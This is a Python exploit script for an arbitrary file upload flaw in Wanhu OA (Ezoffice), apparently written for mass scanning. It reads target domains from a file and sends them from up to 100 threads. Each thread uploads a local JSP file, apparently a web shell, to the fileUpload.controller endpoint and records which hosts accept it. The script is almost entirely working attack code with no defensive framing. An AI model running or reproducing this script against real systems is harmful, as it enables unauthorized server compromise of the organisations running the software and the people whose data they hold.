# 万户OA fileUpload.controller 任意文件上传漏洞
# charis

import requests
from requests.packages import urllib3
urllib3.disable_warnings()
from threading import Thread, enumerate
from time import sleep

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
}

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}

def postData(url, headers, proxies):
    try:
        s = ""
        poc = "/defaultroot/upload/fileUpload.controller"
        urldata = url.strip("\n") + poc
        requests.packages.urllib3.disable_warnings()
        re = requests.post(urldata, headers=headers, proxies=proxies, verify=False)
        files = {'file1': open("D:\\code\\python\\exp\\万户Ezoffice\\kiss.jsp", "rb")}
        re = requests.post(urldata, files=files, proxies=proxies, verify=False)
        if re.text.find('"result":"success"') >= 0:
            print("[+]存在漏洞", re.text, url)
            s += re.text + url
            with open("D:\\code\\python\\exp\\万户Ezoffice\\result.txt", "a", encoding="utf-8") as f:
                f.write(s)

    except requests.exceptions.ConnectionError:
        pass

with open("D:\\code\\python\\exp\\万户OA\\domain.txt", encoding="utf-8") as f:
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, headers, proxies)).start()
        else:
            sleep(1)